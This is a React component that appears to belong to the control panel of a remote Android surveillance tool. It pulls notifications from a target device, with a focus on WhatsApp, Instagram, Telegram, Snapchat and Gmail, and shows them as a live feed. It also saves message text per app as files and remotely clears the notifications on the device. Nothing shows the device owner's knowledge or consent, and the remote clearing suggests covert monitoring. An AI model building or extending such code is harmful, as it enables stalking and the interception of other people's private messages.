import React, { useState, useRef, useEffect } from 'react';

const APP_COLORS = {
  'com.whatsapp': '#25D366',
  'com.instagram.android': '#E1306C',
  'com.facebook.katana': '#1877F2',
  'org.telegram.messenger': '#0088cc',
  'com.snapchat.android': '#FFFC00',
  'com.zhiliaoapp.musically': '#010101',
  'com.twitter.android': '#1DA1F2',
  'com.facebook.orca': '#0099FF',
  'com.google.android.gm': '#EA4335',
  'com.android.phone': '#4CAF50',
  'com.android.dialer': '#4CAF50',
};

function getAppColor(pkg) {
  if (!pkg) return '#7c3aed';
  return APP_COLORS[pkg] || '#' + Math.abs(pkg.split('').reduce((h, c) => (h << 5) - h + c.charCodeAt(0), 0) % 0xFFFFFF).toString(16).padStart(6, '7');
}

function appShort(pkg) {
  if (!pkg) return '?';
  const parts = pkg.split('.');
  return parts[parts.length - 1]?.slice(0, 2).toUpperCase() || '??';
}

function friendlyPkg(pkg) {
  if (!pkg) return 'Unknown';
  return pkg.split('.').pop();
}

export default function NotificationsTab({ device, sendCommand, results, notifPushEntries }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;

  const [filterPkg, setFilterPkg] = useState('');
  const [autoScroll, setAutoScroll] = useState(true);
  const [storedNotifs, setStoredNotifs] = useState([]);
  const seenIds = useRef(new Set());
  const feedEnd = useRef(null);

  useEffect(() => {
    results.forEach(r => {
      if (seenIds.current.has(r.id)) return;
      if (!r.success || !r.response) return;
      if (r.command !== 'get_notifications' && r.command !== 'get_notifications_from_app') return;
      seenIds.current.add(r.id);
      try {
        const d = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
        if (d.notifications) setStoredNotifs(prev => {
          const combined = [...d.notifications, ...prev];
          const seen = new Set();
          return combined.filter(n => {
            const key = `${n.packageName}|${n.postTime}|${n.title}`;
            if (seen.has(key)) return false;
            seen.add(key);
            return true;
          }).slice(0, 500);
        });
      } catch (_) {}
    });
  }, [results]);

  useEffect(() => {
    if (isOnline) sendCommand(deviceId, 'get_notifications', { limit: 100 });
  }, [isOnline]);

  const allEntries = React.useMemo(() => {
    const combined = [...(notifPushEntries || []), ...storedNotifs];
    const seen = new Set();
    return combined.filter(n => {
      const key = `${n.packageName}|${n.postTime || n.timestamp}|${n.title}|${n.text}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }, [notifPushEntries, storedNotifs]);

  const pkgList = [...new Set(allEntries.map(n => n.packageName).filter(Boolean))];

  const filtered = filterPkg
    ? allEntries.filter(n => n.packageName === filterPkg)
    : allEntries;

  useEffect(() => {
    if (autoScroll && feedEnd.current) {
      feedEnd.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [filtered.length, autoScroll]);

  const downloadForApp = (pkg) => {
    if (!pkg) return;
    const entries = allEntries.filter(n => n.packageName === pkg);
    const lines = entries.map(n =>
      `[${n.timestamp || n.postTime}] ${n.appName || pkg}\nTitle: ${n.title}\nText:  ${n.text}\n---`
    ).join('\n');
    const blob = new Blob([lines], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `notifications_${pkg}_${new Date().toISOString().slice(0, 10)}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="notif-tab">
      <div className="notif-toolbar">
        <div className="notif-title">
          🔔 Notifications
          <span className="notif-badge">{filtered.length}</span>
          {(notifPushEntries?.length > 0) && (
            <span className="notif-live-dot">● LIVE</span>
          )}
        </div>
        <div className="notif-controls">
          <select
            value={filterPkg}
            onChange={e => setFilterPkg(e.target.value)}
            className="notif-filter-select"
          >
            <option value="">All Apps ({allEntries.length})</option>
            {pkgList.map(p => (
              <option key={p} value={p}>{friendlyPkg(p)} ({allEntries.filter(n => n.packageName === p).length})</option>
            ))}
          </select>
          {filterPkg && (
            <button className="notif-btn notif-btn-dl" onClick={() => downloadForApp(filterPkg)} title="Download as .txt">
              ⬇ Download
            </button>
          )}
          <label className="notif-autoscroll">
            <input type="checkbox" checked={autoScroll} onChange={e => setAutoScroll(e.target.checked)} />
            Auto-scroll
          </label>
          <button className="notif-btn" onClick={() => sendCommand(deviceId, 'get_notifications', { limit: 100 })} disabled={!isOnline}>
            ↻ Refresh
          </button>
          <button className="notif-btn notif-btn-danger" onClick={() => {
            sendCommand(deviceId, 'clear_notifications', {});
            setStoredNotifs([]);
          }} disabled={!isOnline}>
            🧹 Clear
          </button>
        </div>
      </div>

      <div className="notif-feed">
        {filtered.length === 0 ? (
          <div className="notif-empty">
            <div style={{ fontSize: 40 }}>🔔</div>
            <div>No notifications yet</div>
            <div style={{ fontSize: 12, color: '#64748b' }}>
              {isOnline ? 'Waiting for notifications…' : 'Device offline'}
            </div>
          </div>
        ) : (
          filtered.map((n, i) => {
            const color = getAppColor(n.packageName);
            return (
              <div key={`${n.packageName}-${n.postTime || n.timestamp}-${i}`} className="notif-entry">
                <div
                  className="notif-app-badge"
                  style={{ background: color + '22', borderColor: color + '66', color }}
                >
                  {appShort(n.packageName)}
                </div>
                <div className="notif-entry-body">
                  <div className="notif-entry-header">
                    <span className="notif-app-name" style={{ color }}>{n.appName || friendlyPkg(n.packageName)}</span>
                    <span className="notif-ts">{(n.timestamp || '').slice(11, 19)}</span>
                  </div>
                  {n.title && <div className="notif-title-text">{n.title}</div>}
                  {n.text && <div className="notif-text">{n.text}</div>}
                </div>
              </div>
            );
          })
        )}
        <div ref={feedEnd} />
      </div>

      {pkgList.length > 0 && (
        <div className="notif-app-download-bar">
          <span style={{ fontSize: 12, color: '#64748b', marginRight: 8 }}>Download by app:</span>
          {pkgList.map(p => (
            <button key={p} className="notif-btn notif-btn-sm" onClick={() => downloadForApp(p)} title={p}>
              ⬇ {friendlyPkg(p)}
            </button>
          ))}
        </div>
      )}
    </div>
  );
}
